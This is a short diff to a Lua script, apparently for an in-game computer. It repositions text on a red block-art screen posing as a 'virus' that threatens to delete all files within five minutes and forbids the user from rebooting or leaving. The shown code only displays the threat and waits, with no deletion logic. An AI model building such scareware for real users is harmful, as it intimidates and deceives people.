@@ -16,6 +16,8 @@ gpu.setResolution(80, 25)
 gpu.setBackground(0xff0000)
 gpu.setForeground(0xFFFFFF)
 
+gpu.fill(1, 1, 80, 25, " ")
+
 gpu.set(1, 1, "█████████████▀▀▀▀▀▀▀▀█████████████")
 os.sleep(0.3)
 gpu.set(1, 2, "████████████░░░░░░░░░░████████████")
@@ -42,17 +44,17 @@ gpu.set(1, 12, "███░░░░█████████░░███�
 
 os.sleep(0.5)
 
-gpu.set(10, 1, "You Have a 5 minutes")
+gpu.set(30, 1, "You Have a 5 minutes")
 os.sleep(0.3)
-gpu.set(10, 3, "After five minutes, all your files will be deleted!")
+gpu.set(30, 3, "After five minutes, all your files will be deleted!")
 os.sleep(0.3)
-gpu.set(10, 6, "Rules:")
+gpu.set(30, 6, "Rules:")
 os.sleep(0.3)
-gpu.set(10, 8, "1. Don't try delete this virus")
+gpu.set(30, 8, "1. Don't try delete this virus")
 os.sleep(0.3)
-gpu.set(10, 10, "2. Don't Reboot Computer")
+gpu.set(30, 10, "2. Don't Reboot Computer")
 os.sleep(0.3)
-gpu.set(10, 12, "3. Don't leave this program")
+gpu.set(30, 12, "3. Don't leave this program")
 
 os.sleep(300)
 
